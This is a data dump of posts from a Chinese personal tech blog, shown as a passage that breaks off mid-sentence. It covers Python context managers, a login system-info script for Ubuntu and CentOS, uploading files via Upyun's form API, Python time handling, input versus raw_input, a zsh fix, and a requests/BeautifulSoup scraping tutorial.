resources]可以看到，生成器函数中 yield 之前的语句在 enter() 方法中执行，yield 之后的语句在 exit() 中执行，而 yield 产生的值赋给了 as 子句中的 value 变量。需要注意的是，contextmanager 只是省略了 enter() / exit() 的编写，但并不负责实现资源的“获取”和“清理”工作；“获取”操作需要定义在 yield 语句之前，“清理”操作需要定义 yield 语句之后，这样 with 语句在执行 enter() / exit() 方法时会执行这些语句以获取/释放资源，即生成器函数中需要实现必要的逻辑控制，包括资源访问出现错误时抛出适当的异常。 函数 nestednested 可以将多个上下文管理器组织在一起，避免使用嵌套 with 语句。清单 11. nested 语法 with nested(A(), B(), C()) as (X, Y, Z): # with-body code here类似于：清单 12. nested 执行过程 with A() as X: with B() as Y: with C() as Z: # with-body code here需要注意的是，发生异常后，如果某个上下文管理器的 exit() 方法对异常处理返回 False，则更外层的上下文管理器不会监测到异常。 上下文管理器 closingclosing 的实现如下：清单 13. 上下文管理 closing 实现 class closing(object): # help doc here def __init__(self, thing): self.thing = thing def __enter__(self): return self.thing def __exit__(self, *exc_info): self.thing.close()上下文管理器会将包装的对象赋值给 as 子句的 target 变量，同时保证打开的对象在 with-body 执行完后会关闭掉。closing 上下文管理器包装起来的对象必须提供 close() 方法的定义，否则执行时会报 AttributeError 错误。清单 14. 自定义支持 closing 的对象 class ClosingDemo(object): def __init__(self): self.acquire() def acquire(self): print &apos;Acquire resources.&apos; def free(self): print &apos;Clean up any resources acquired.&apos; def close(self): self.free() with closing(ClosingDemo()): print &apos;Using resources&apos;结果输出如下：清单 15. 自定义 closing 对象的输出结果 Acquire resources. Using resources Clean up any resources acquired.closing 适用于提供了 close() 实现的对象，比如网络连接、数据库连接等，也可以在自定义类时通过接口 close() 来执行所需要的资源“清理”工作。 小结本文对 with 语句的语法和工作机理进行了介绍，并通过示例介绍了如何实现自定义的上下文管理器，最后介绍了如何使用 contextlib 模块来简化上下文管理器的编写。 本文转载自https://www.ibm.com/developerworks/cn/opensource/os-cn-pythonwith/index.html","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"修改Ubuntu的登陆信息","slug":"修改Ubuntu的登陆信息","date":"2017-07-14T14:09:23.000Z","updated":"2021-02-26T06:05:29.312Z","comments":true,"path":"posts/795332316.html","link":"","permalink":"https://awen.me/posts/795332316.html","excerpt":"需求是这样的，我希望登陆系统的时候能够显示系统的一些基本信息，比如 cpu、内存、负载、内核、IP 等等信息，如图所示","text":"需求是这样的，我希望登陆系统的时候能够显示系统的一些基本信息，比如 cpu、内存、负载、内核、IP 等等信息，如图所示 默认登陆是类型下面的信息 实现其实这个很好实现，写个 shell 脚本就好，在 Ubuntu 上，我一开始以为和 centos 一样修改/etc/motd文件就可以。不过发现 Ubuntu 的开机信息好像是在/var/run/motd.dynamic,而这个文件却修改了无效，再次登录会被还原，于是我找了下发现，这个文件的信息其实是有几个脚本控制的。这几个脚本在/etc/update-motd.d/目录下 然而， 你发现你登陆的时候的信息，其实都是这几个文件的脚本输出的，这几个文件其实都是 shell 脚本，我们把几个脚本的内容全部注释掉，然后修改00-hader 文件，添加下面的内容 脚本 #!/bin/bash uptimeinfo=`uptime | awk -F&quot; &quot; &apos;{print $9,$10,$11}&apos;` osname=`cat /etc/issue| head -n 1|awk -F &quot; &quot; &apos;{print $1,$2,$3}&apos;` hostnameinfo=`hostname` Kernelinfo=`uname -r` privateip=`/bin/hostname -i|awk &apos;{print $1}&apos;` publicip=`/bin/hostname -i|awk &apos;{print $2}&apos;` cpuinfo=`cat /proc/cpuinfo |grep &apos;model name&apos;| tail -n 1| awk -F&quot; &quot; &apos;{print $4,$5,$6,$7,$8,$9,$10}&apos;` cpunum=`cat /proc/cpuinfo |grep processor|wc -l` meminfo=`free -h| awk &apos;{print $2}&apos;| grep -v used|head -n 1` interface=`ifconfig |head -n 1|awk &apos;{print $1}&apos;` echo -e &quot;\\033[33m OS: &quot;${osname} echo -e &quot; Kernel: &quot;${Kernelinfo} echo -e &quot; CPU: &quot;${cpuinfo}&quot;[&quot;${cpunum}&quot;]&quot; echo -e &quot; MEM: &quot;${meminfo} echo -e &quot; ---------------------------------------------------------------&quot; echo -e &quot; UPTIME:1 min&quot; echo -e &quot; LOAD:&quot; ${uptimeinfo} echo -e &quot; ---------------------------------------------------------------&quot; echo -e &quot; Hostname:&quot;${hostnameinfo} echo -e &quot; ---------------------------------------------------------------&quot; echo -e &quot; private (*active) IP:&quot;${privateip} echo -e &quot; public (*active) IP:&quot;${publicip} echo -e &quot; --------------------------------------------------------------- \\033[0m&quot;效果然后在重新登录就得到了一开始的效果了。 关于终端颜色其实 Ubuntu 下不加-e 也可以的 echo -e &quot;\\033[30m 黑色字 \\033[0m&quot; echo -e &quot;\\033[31m 红色字 \\033[0m&quot; echo -e &quot;\\033[32m 绿色字 \\033[0m&quot; echo -e &quot;\\033[33m 黄色字 \\033[0m&quot; echo -e &quot;\\033[34m 蓝色字 \\033[0m&quot; echo -e &quot;\\033[35m 紫色字 \\033[0m&quot; echo -e &quot;\\033[36m 天蓝字 \\033[0m&quot; echo -e &quot;\\033[37m 白色字 \\033[0m&quot; echo -e &quot;\\033[40;37m 黑底白字 \\033[0m&quot; echo -e &quot;\\033[41;37m 红底白字 \\033[0m&quot; echo -e &quot;\\033[42;37m 绿底白字 \\033[0m&quot; echo -e &quot;\\033[43;37m 黄底白字 \\033[0m&quot; echo -e &quot;\\033[44;37m 蓝底白字 \\033[0m&quot; echo -e &quot;\\033[45;37m 紫底白字 \\033[0m&quot; echo -e &quot;\\033[46;37m 天蓝底白字 \\033[0m&quot; echo -e &quot;\\033[47;30m 白底黑字 \\033[0m&quot;centos 如何修改1.首先要把/etc/motd文件的权限给改下，我这里就给777了。然后写个脚本，比如就叫 systeminfo吧。放到/usr/local/bin下，赋予可执行权限 #!/bin/bash uptimeinfo=`uptime | awk -F&quot; &quot; &apos;{print $9,$10,$11}&apos;` osname=`cat /etc/issue| head -n 1|awk -F &quot; &quot; &apos;{print $1,$2,$3}&apos;` hostnameinfo=`hostname` Kernelinfo=`uname -r` privateip=`/bin/hostname -i|awk &apos;{print $1}&apos;` publicip=`/bin/hostname -i|awk &apos;{print $2}&apos;` cpuinfo=`cat /proc/cpuinfo |grep &apos;model name&apos;| tail -n 1| awk -F&quot; &quot; &apos;{print $4,$5,$6,$7,$8,$9,$10}&apos;` cpunum=`cat /proc/cpuinfo |grep processor|wc -l` meminfo=`free -h| awk &apos;{print $2}&apos;| grep -v used|head -n 1` interface=`ifconfig |head -n 1|awk &apos;{print $1}&apos;` echo -e &quot;\\033[33m OS: &quot;${osname} echo -e &quot; Kernel: &quot;${Kernelinfo} echo -e &quot; CPU: &quot;${cpuinfo}&quot;[&quot;${cpunum}&quot;]&quot; echo -e &quot; MEM: &quot;${meminfo} echo -e &quot; ---------------------------------------------------------------&quot; echo -e &quot; UPTIME:1 min&quot; echo -e &quot; LOAD:&quot; ${uptimeinfo} echo -e &quot; ---------------------------------------------------------------&quot; echo -e &quot; Hostname:&quot;${hostnameinfo} echo -e &quot; ---------------------------------------------------------------&quot; echo -e &quot; private (*active) IP:&quot;${privateip} echo -e &quot; public (*active) IP:&quot;${publicip} echo -e &quot; --------------------------------------------------------------- \\033[0m&quot;然后修改/etc/profile文件，在末尾添加 if [ -f /etc/profile ];then /usr/local/bin/systeminfo &gt; /etc/motd fi然后执行 source /etc/profile 原理是用户登陆后都需要首先找/etc/profile文件的变量，在该文件执行这个命令会把结果写入/etc/motd文件 最终结果","categories":[],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://awen.me/tags/Ubuntu/"}]},{"title":"使用Python调用又拍云表单API 上传文件","slug":"使用Python调用又拍云表单API-上传文件","date":"2017-07-14T09:43:50.000Z","updated":"2021-02-26T06:05:29.308Z","comments":true,"path":"posts/371272214.html","link":"","permalink":"https://awen.me/posts/371272214.html","excerpt":"又拍云的签名计算方式，可以参考官网文档 本文主要介绍又拍云的表单上传，通过又拍云的表单 API 可以直接把本地文件上传到又拍云存储而不需要经过自己的服务器","text":"又拍云的签名计算方式，可以参考官网文档 本文主要介绍又拍云的表单上传，通过又拍云的表单 API 可以直接把本地文件上传到又拍云存储而不需要经过自己的服务器 代码#!/usr/bin/python # -*- coding:utf-8 -*- import hashlib import base64 import json import hashlib import datetime import requests import time import json DEFAULT_CHUNKSIZE = 8192 bucket = &apos;&apos; #空间名 secret = &apos;&apos; #表单密钥，后台找到对应服务---高级功能开启表单后复制 expiration = int(time.time())+8000 # 签名过期时间 uploadfile = &apos;/Users/wenjun/Downloads/test.mp4&apos; #上传文件的路径 save_key = &apos;/{year}/{mon}/{day}/upload_{random32}{.suffix}&apos; #在UPYUN空间的保存路径 content_type = &quot;video/mp4&quot; # 文件类型 # md5计算 def make_content_md5(value, chunksize=DEFAULT_CHUNKSIZE): if hasattr(value, &apos;fileno&apos;): md5 = hashlib.md5() for chunk in iter(lambda: value.read(chunksize), b&apos;&apos;): md5.update(chunk) value.seek(0) return md5.hexdigest() elif isinstance(value, bytes) or (not PY3 and isinstance(value, builtin_str)): return hashlib.md5(value).hexdigest() else: raise UpYunClientException(&apos;object type error&apos;) # 计算 policy def make_policy(data): policy = json.dumps(data) return base64.b64encode(policy) #上传 def upload(): #上传参数，此处只传了几个必须的参数，其他参考可以参考官网文档表单API 上传参数部分的表中内容 data = {&apos;bucket&apos;: bucket, &apos;expiration&apos;: expiration, &apos;save-key&apos;: save_key, &apos;content-type&apos;:content_type, &apos;b64encoded&apos;: &apos;on&apos;, } policy = make_policy(data) signature = make_content_md5(policy + &apos;&amp;&apos; + secret) # 计算签名 print &quot;---------计算签名完成，准备上传参数----------------&quot; with open(uploadfile, &apos;rb&apos;) as value: value = base64.b64encode(value.read()); postdata = {&apos;policy&apos;: policy, &apos;signature&apos;: signature, &apos;file&apos;: value, } print &quot;---------准备请求参数完成，开始上传----------------&quot; r = requests.post(&quot;http://v0.api.upyun.com/file201503&quot;, files=postdata) if r.status_code == 200: print &quot;---------文件上传成功，正在模拟是否可以访问----------------&quot; # 此处需要将 text 的内容转换成 json 格式，然后取出其中的 url uploadinfo = json.loads(r.text) headurl = &quot;http://&quot;+bucket+&quot;.b0.upaiyun.com&quot;+uploadinfo[&quot;url&quot;] print &quot;---------模拟访问完成，以下是访问结果----------------&quot; r = requests.head(headurl) if r.status_code == 200: print &quot;---------文件可以访问，访问地址是:&quot; print headurl elif requests == 404: print &quot;---------文件访问404,由于 CDN 缓存问题，您可以稍后用浏览器尝试访问，您的地址:&quot; print headurl else : print &quot;文件上传失败&quot; if __name__ == &quot;__main__&quot;: upload()运行结果","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"python时间转换","slug":"python时间转换","date":"2017-07-13T06:57:18.000Z","updated":"2021-02-26T06:05:29.288Z","comments":true,"path":"posts/3190597901.html","link":"","permalink":"https://awen.me/posts/3190597901.html","excerpt":"获取当前时间 &gt;&gt;&gt; import time &gt;&gt;&gt; time.time() 1499929004.413384 &gt;&gt;&gt;","text":"获取当前时间 &gt;&gt;&gt; import time &gt;&gt;&gt; time.time() 1499929004.413384 &gt;&gt;&gt; 上面的是 uninx 时间戳，我们还可以将他转换成整数 &gt;&gt;&gt; import time &gt;&gt;&gt; time = time.time() &gt;&gt;&gt; time 1499929710.776266 &gt;&gt;&gt; int (time) 1499929710上面的值对于人类而言并不直观，不好理解，我们可以这样转换 &gt;&gt;&gt; time.localtime() time.struct_time(tm_year=2017, tm_mon=7, tm_mday=13, tm_hour=6, tm_min=58, tm_sec=27, tm_wday=3, tm_yday=194, tm_isdst=0) &gt;&gt;&gt;我们可以这样 &gt;&gt;&gt; time = time.localtime(time.time()) &gt;&gt;&gt; time time.struct_time(tm_year=2017, tm_mon=7, tm_mday=13, tm_hour=6, tm_min=59, tm_sec=32, tm_wday=3, tm_yday=194, tm_isdst=0) &gt;&gt;&gt; time = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time) Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; AttributeError: &apos;time.struct_time&apos; object has no attribute &apos;strftime&apos; 注意。Python，我当前的Python 2.7.12 (default, Nov 19 2016, 06:48:10) 报错 而 Python3.5 没有问题 ➜ ~ python3.5 Python 3.5.1 (v3.5.1:37a07cee5969, Dec 5 2015, 21:12:44) [GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; import time &gt;&gt;&gt; st = time.localtime(time.time()) &gt;&gt;&gt; st time.struct_time(tm_year=2017, tm_mon=7, tm_mday=13, tm_hour=15, tm_min=2, tm_sec=51, tm_wday=3, tm_yday=194, tm_isdst=0) &gt;&gt;&gt; time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,st) &apos;2017-07-13 15:02:51&apos;","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"input和raw_input的区别","slug":"input和raw-input的区别","date":"2017-07-11T06:07:42.000Z","updated":"2021-02-26T06:05:29.273Z","comments":true,"path":"posts/4078132765.html","link":"","permalink":"https://awen.me/posts/4078132765.html","excerpt":"input 和 raw_input我们看下面的代码 #!/usr/bin/python name = input(&quot;What is your name ?&quot;) print &quot;hello,&quot;+name+&quot;!&quot;","text":"input 和 raw_input我们看下面的代码 #!/usr/bin/python name = input(&quot;What is your name ?&quot;) print &quot;hello,&quot;+name+&quot;!&quot; 执行，输入name，直接就报错了 What is your name ?awen Traceback (most recent call last): File &quot;test.py&quot;, line 2, in &lt;module&gt; name = input(&quot;What is your name ?&quot;) File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt; NameError: name &apos;awen&apos; is not defined而加上引号输入则没有问题 What is your name ?&quot;awen&quot; hello,awen!因为 input 会假设输入的是合法的表达式，如果输入带引号的值是没有问题的。 那么修改为 raw_input 呢 #!/usr/bin/python name = raw_input(&quot;What is your name ?&quot;) print &quot;hello,&quot;+name+&quot;!&quot;我们在保存运行下，完全没问题 What is your name ?awen hello,awen!所以，在编写 python 程序，要求输入时，除非特别的需求，否则尽量使用 raw_input","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"mac下zsh报错：_arguments:451: _vim_files: function definition file not found","slug":"mac下zsh报错：-arguments-451-vim-files-function-definition-file-not-found","date":"2017-07-10T09:01:52.000Z","updated":"2021-02-26T06:05:29.277Z","comments":true,"path":"posts/2583143647.html","link":"","permalink":"https://awen.me/posts/2583143647.html","excerpt":"","text":"使用vim编辑文件自动补全会出现错误 _vim_files: function definition file not found解决方法： 删除以.zcompdump-开头的文件rm -rf ~/.zcompdump-* exec zsh","categories":[],"tags":[{"name":"zsh","slug":"zsh","permalink":"https://awen.me/tags/zsh/"}]},{"title":"python爬虫","slug":"python爬虫","date":"2017-07-10T04:56:48.000Z","updated":"2021-02-26T06:05:29.289Z","comments":true,"path":"posts/3686208739.html","link":"","permalink":"https://awen.me/posts/3686208739.html","excerpt":"Python 爬取网站图片，我们打开 http://desk.zol.com.cn/bizhi/6429_79089_2.html 发现该网页有很多图片，并且我们点击下一页后会跳转到下一页，那么我们用 python 要如何爬去改页面的图片资源呢？","text":"Python 爬取网站图片，我们打开 http://desk.zol.com.cn/bizhi/6429_79089_2.html 发现该网页有很多图片，并且我们点击下一页后会跳转到下一页，那么我们用 python 要如何爬去改页面的图片资源呢？ python requests 库requests 库的官网http://docs.python-requests.org/en/master/ 安装pip(3) install requests使用使用 requests 库，需要对 http 协议有一定的了解，比如状态码，请求头，响应头，方法、字段、参数等概念有一定的了解。 我们导入库后，发送一个 get 请求 &gt;&gt;&gt; import requests &gt;&gt;&gt; r = requests.get(&quot;http://desk.zol.com.cn/bizhi/6429_79089_2.html&quot;) &gt;&gt;&gt; r.status_code #返回状态码为成功 200上面的 requests.get(url,params=None,**kwargs) 中： url： 是指获取页面的 url 连接 params：是 url 的额外参数，比如一些请求头，例如有些网站做了防盗链，需要特殊的 referer 或 user-agent 才可以访问，否则拒绝访问，那么我们可以通过定制一些请求头去进行访问。 **kewrgs 12个控制访问的参数 通过 r.headers 可以获取响应头信息 &gt;&gt;&gt; type(r) &lt;class &apos;requests.models.Response&apos;&gt; &gt;&gt;&gt; r.headers {&apos;Content-Length&apos;: &apos;27571&apos;, &apos;Via&apos;: &apos;http/1.1 zats-other1 (zcache-other1 [cRs f ])&apos;, &apos;Age&apos;: &apos;3983&apos;, &apos;Expires&apos;: &apos;Mon, 10 Jul 2017 05:59:40 GMT&apos;, &apos;Vary&apos;: &apos;Accept-Encoding&apos;, &apos;Server&apos;: &apos;ngx_openresty&apos;, &apos;Last-Modified&apos;: &apos;Mon, 10 Jul 2017 03:59:40 GMT&apos;, &apos;Connection&apos;: &apos;keep-alive&apos;, &apos;Cache-Control&apos;: &apos;max-age=7200&apos;, &apos;Date&apos;: &apos;Mon, 10 Jul 2017 05:06:03 GMT&apos;, &apos;nnCoection&apos;: &apos;close&apos;, &apos;Content-Type&apos;: &apos;text/html; charset=GBK&apos;}response 对象的属性 属性 说明 r.status_code HTTP请求的返回状态，200表示成功，其他都表示有问题 r.text HTTP 响应内容的字符串形式，url 对应的页面内容 r.encoding HTTP Header 中猜测的响应头状态码 r.apparent_encoding 从内容中分析出的响应内容编码方式 r.content 响应内容的二进制形式 &gt;&gt;&gt; r.encoding &apos;GBK&apos; &gt;&gt;&gt; r.content &apos;&lt;!DOCTYPE HTML&gt;\\r\\n&lt;html&gt;\\r\\n&lt;head&gt;\\r\\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;\\r\\n&lt;meta name=&quot;applicable-device&quot; content=&quot;pc&quot;&gt;\\r\\n&lt;title&gt;\\xba\\xab\\xb9\\xfa\\xd0\\xa1\\xc7\\xe5\\xd0\\xc2\\xc4\\xcf\\xb9\\xe7\\xc0\\xf6\\xbf\\xed\\xc6\\xc1\\xb1\\xda\\xd6\\xbd-ZOL\\xd7\\xc0\\xc3\\xe6\\xb1\\xda\\xd6\\xbd&lt;/title&gt;\\r\\n &lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;\\r\\n &lt;meta name=&quot;description&quot; content=&quot;&quot;/&gt;&lt;meta property=&quot;og:type&quot; content=&quot;image&quot;/&gt;\\n&lt;meta property=&quot;og:image&quot; content=&quot;http://desk.fd.zol-img.com.cn/t_s120x90c5/g5/M00/0B/05/ChMkJlcgdH2IVmv2AAYP2zcB7GQAAQr3gJjQtUABg_z016.jpg!awen)&quot;/&gt;\\n\\r\\n&lt;link href=&quot;http://s.zol-img.com.cn/d/Desk/Desk_bizhi_detail.css?v=1028&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;\\r\\n\\r\\n&lt;script src=&quot;http://p.zol-img.com.cn/desk/detail.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\\r\\n&lt;script src=&quot;http://icon.zol-img.com.cn/public/js/swfobject.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\\r\\n&lt;script src=&quot;http://icon.zol-img.com.cn/getcook.js?1312&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;\\r\\n&lt;script&gt;\\r\\n\\tdocument.domain = &quot;zol.com.cn&quot;;\\r\\n\\tvar userid = get_cookie(\\&apos;zol_userid\\&apos;);\\r\\n\\t\\tvar deskPicArr \\t\\t= {&quot;list&quot;:[{&quot;picId&quot;:&quot;79089&quot;,&quot;oriSize&quot;:&quot;2560x1600&quot;,&quot;resAll&quot;:[&quot;2560x1600&quot;,&quot;1920x1080&quot;,&quot;1680x1050&quot;,&quot;1600x900&quot;,&quot;1440x900&quot;,&quot;1366x768&quot;,&quot;1280x1024&quot;,&quot;1280x800&quot;,&quot;1024x768&quot;],&quot;imgsrc&quot;:&quot;http:\\\\/\\\\/desk.fd.zol-img.com.cn\\\\/t_s##SIZE##\\\\/g5\\\\/M00\\\\/0B\\\\/05\\\\/ChMkJlcgdH2IVmv2AAYP2zcB7GQAAQr3gJjQtUABg_z016.jpg!awen)&quot;},{&quot;picId&quot;:&quot;79087&quot;,&quot;oriSize&quot;:&quot;2560x1600&quot;,&quot;resAll&quot;:[&quot;2560x1600&quot;,&quot;1920x1080&quot;,&quot;1680x1050&quot;,&quot;1600x900&quot;,&quot;1440x900&quot;,&quot;1366x768&quot;,&quot;1280x1024&quot;,&quot;1280x800&quot;,&quot;1024x768&quot;],&quot;imgsrc&quot;:&quot;http:\\\\/\\\\/desk.fd.zol-img.com.cn\\\\/t_s##SIZE##\\\\/g5\\\\/M00\\\\/0B\\\\/05\\\\/ChMkJ1cgdHmIaBQ5AAxkE0uQNWQAAQr3QO8WIIADGQr480.jpg!awen)&quot;},{&quot;picId&quot;:&quot;79088&quot;,&quot;oriSize&quot;:&quot;2560x1600&quot;,&quot;resAll&quot;:[&quot;2560x1600&quot;,&quot;1920x1080&quot;,&quot;1680x1050&quot;,&quot;1600x900&quot;,&quot;1440x900&quot;,&quot;1366x768&quot;,&quot;1280x1024&quot;,&quot;1280x800&quot;,&quot;1024x768&quot;],&quot;imgsrc&quot;:&quot;http:\\\\/\\\\/desk.fd.zol-img.com.cn\\\\/t_s##SIZE##\\\\/g5\\\\/M00\\\\/0B\\\\/05\\\\/ChMkJ1cgdHuIZqqBAA-e_5SjTQMAAQr3gD3HtsAD58X749.jpg!awen)&quot;},{&quot;picId&quot;:&quot;79090&quot;,&quot;oriSize&quot;:&quot;2560x1600&quot;,&quot;resAll&quot;:[&quot;2560x1600&quot;,&quot;1920x1080&quot;,&quot;1680x1050&quot;,&quot;1600x900&quot;,&quot;1440x900&quot;,&quot;1366x768&quot;,&quot;1280x1024&quot;,&quot;1280x800&quot;,&quot;1024x768&quot;],&quot;imgsrc&quot;:&quot;http:\\\\/\\\\/desk.fd.zol-img.com.cn\\\\/t_s##SIZE##\\\\/g5\\\\/M00\\\\/0B\\\\/05\\\\/ChMkJlcgdH6IJHoZAAxppAZiw2UAAQr3gMT8GkADGm8468.jpg!awen)&quot;},{&quot;picId&quot;:&quot;79091&quot;,&quot;oriSize&quot;:&quot;2560x1600&quot;,&quot;resAll&quot;:[&quot;2560x1600&quot;,&quot;1920x1080&quot;,&quot;1680x1050&quot;,&quot;1600x900&quot;,&quot;1440x900&quot;,&quot;1366x768&quot;,&quot;1280x1024&quot;,&quot;1280x800&quot;,&quot;1024x768&quot;],&quot;imgsrc&quot;:&quot;http:\\\\/\\\\/desk.fd.zol-img.com.cn\\\\/t_s##SIZE##\\\\/g5\\\\/M00\\\\/0B\\\\/05\\\\/ChMkJlcgdICIFA7wAAwW8vbAcEYAAQr3wBYmyYADBcK439.jpg!awen)&quot;},{&quot;picId&quot;:&quot;79092&quot;,&quot;oriSize&quot;:&quot;2560x1600&quot;,&quot;resAll&quot;:[&quot;2560x1600&quot;,&quot;1920x1080&quot;,&quot;1680x1050&quot;,&quot;1600x900&quot;,&quot;1440x900&quot;,&quot;1366x768&quot;,&quot;1280x1024&quot;,&quot;1280x800&quot;,&quot;1024x768&quot;],&quot;imgsrc&quot;:&quot;http:\\\\/\\\\/desk.fd.zol-img.com.cn\\\\/t_s##SIZE##\\\\/g5\\\\/M00\\\\/0B\\\\/05\\\\/ChMkJ1cgdIKIHmjLAAW0KFEpkQUAAQr3wGS5wkABbRA556.jpg!awen)&quot;},{&quot;picId&quot;:&quot;79093&quot;,&quot;oriSize&quot;:&quot;2560x1600&quot;,&quot;resAll&quot;:[&quot;2560x1600&quot;,&quot;1920x1080&quot;,&quot;1680x1050&quot;,&quot;1600x900&quot;,&quot;1440x900&quot;,&quot;1366x768&quot;,&quot;1280x1024&quot;,&quot;1280x800&quot;,&quot;1024x768&quot;],&quot;imgsrc&quot;:&quot;http:\\\\/\\\\/desk.fd.zol-img.com.cn\\\\/t_s##SIZE##\\\\/g5\\\\/M00\\\\/0B\\\\/05\\\\/ChMkJ1cgdISId2OQAA3bomjVkl0AAQr3wI0BO4ADdu6814.jpg!awen)&quot;}]};\\r\\n\\t/***********\\xc8\\xab\\xbe\\xd6\\xb1\\xe4\\xc1\\xbf\\xb5\\xc4\\xc9\\xf9\\xc3\\xf7*************/\\r\\n\\tvar $deskGlobalConfig = {\\r\\n\\t\\t\\tgroupId\\t\\t\\t: 6429,\\t\\t\\t//\\xd7\\xe9\\xcd\\xbcID\\r\\n\\t\\t\\tp如果乱码，则 &gt;&gt;&gt; r.apparent_encoding &apos;GB2312&apos; &gt;&gt;&gt; r.encoding =&apos;utf-8&apos; 如果 header 中不存在 charset，则认为编码为 ISO-8859-1 请求异常处理 属性 说明 requests.ConnectionError 网络连接错误异常，如 DNS 查询失败， 拒绝连接 requests.HTTPError HTTP 错误异常 requests. URLRequired URL 缺失异常 requests.TooManyRedirects 连接远程服务器超时 requests.Timeout 请求 URL 超时，产生的异常 #!/usr/bin/python #!-*-conding:utf-8 -*- import requests def getHTMLIMG(url): try: r = requests.get(url,timeout=30) r.raise_for_status()# 如果状态不是200 引发 HTTPError 异常 r.encoding = r.apparent_encoding return r.text except: return &quot;请求异常&quot; if __name__ == &quot;__main__&quot;: url = &quot;http://desk.zol.com.cn/bizhi/6429_79089_2.html&quot; print(getHTMLIMG(url)) requests 的 http 方法 方法 说明 requests.requets() 构造一个请求，支持以下各自方法的基础 requests.get() get请求，获取实体内容 requests.head() 获取头信息 requests.post() 提交 POST 请求 requests.put() 提交 PUT 请求 requests.patch() 提交局部的修改请求 requests.delete() 提交删除请求 我们使用爬虫，大部分都是使用get方法比较多。 Beautiful Soup安装pip install beautifulsoup4官网https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html 使用➜ ~ python Python 2.7.13 (v2.7.13:a06454b1afa1, Dec 17 2016, 12:39:47) [GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; import requests &gt;&gt;&gt; r = requests.get(&quot;http://python123.io/ws/demo.html&quot;) &gt;&gt;&gt; demo = r.text u&apos;&lt;html&gt;&lt;head&gt;&lt;title&gt;This is a python demo page&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body&gt;\\r\\n&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;\\r\\n&lt;p class=&quot;course&quot;&gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:\\r\\n&lt;a href=&quot;http://www.icourse163.org/course/BIT-268001&quot; class=&quot;py1&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt; and &lt;a href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; class=&quot;py2&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;\\r\\n&lt;/body&gt;&lt;/html&gt;&apos;导入bs4&gt;&gt;&gt; from bs4 import BeautifulSoup &gt;&gt;&gt; soup = BeautifulSoup(demo,&quot;html.parser&quot;) &gt;&gt;&gt; print(soup.prettify()) &lt;html&gt; &lt;head&gt; &lt;title&gt; This is a python demo page &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p class=&quot;title&quot;&gt; &lt;b&gt; The demo python introduces several python courses. &lt;/b&gt; &lt;/p&gt; &lt;p class=&quot;course&quot;&gt; Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses: &lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt; Basic Python &lt;/a&gt; and &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt; Advanced Python &lt;/a&gt; . &lt;/p&gt; &lt;/body&gt; &lt;/html&gt; &gt;&gt;&gt;显示title&gt;&gt;&gt; soup.title &lt;title&gt;This is a python demo page&lt;/title&gt;打印a标签&gt;&gt;&gt; tag = soup.a &gt;&gt;&gt; tag &lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt;上面的只能返回第一个标签 ##获取名字 &gt;&gt;&gt; soup.a.name u&apos;a&apos; &gt;&gt;&gt; soup.a.parent.name u&apos;p&apos; &gt;&gt;&gt; soup.a.parent.parent.name u&apos;body&apos;获得数据内容&gt;&gt;&gt; tag = soup.a &gt;&gt;&gt; tag.attrs {u&apos;href&apos;: u&apos;http://www.icourse163.org/course/BIT-268001&apos;, u&apos;class&apos;: [u&apos;py1&apos;], u&apos;id&apos;: u&apos;link1&apos;} &gt;&gt;&gt; tag.attrs[&apos;class&apos;] [u&apos;py1&apos;] &gt;&gt;&gt; tag.attrs[&apos;href&apos;] u&apos;http://www.icourse163.org/course/BIT-268001&apos;查看标签类型&gt;&gt;&gt; type(tag.attrs) &lt;type &apos;dict&apos;&gt; &gt;&gt;&gt; type(tag) &lt;class &apos;bs4.element.Tag&apos;&gt;获得标签中的内容&gt;&gt;&gt; soup.a.string u&apos;Basic Python&apos; &gt;&gt;&gt; soup.p.string u&apos;The demo python introduces several python courses.&apos;上面我们看到p标签的内容中其实是包含一个b的 &lt;p class=&quot;title&quot;&gt; &lt;b&gt; The demo python introduces several python courses. &lt;/b&gt; &lt;/p&gt;说明该方法是可以跨域多个层的 beautiful soup元素 遍历遍历分上下平行遍历 &gt;&gt;&gt; soup.head &lt;head&gt;&lt;title&gt;This is a python demo page&lt;/title&gt;&lt;/head&gt; &gt;&gt;&gt; soup.head.contents [&lt;title&gt;This is a python demo 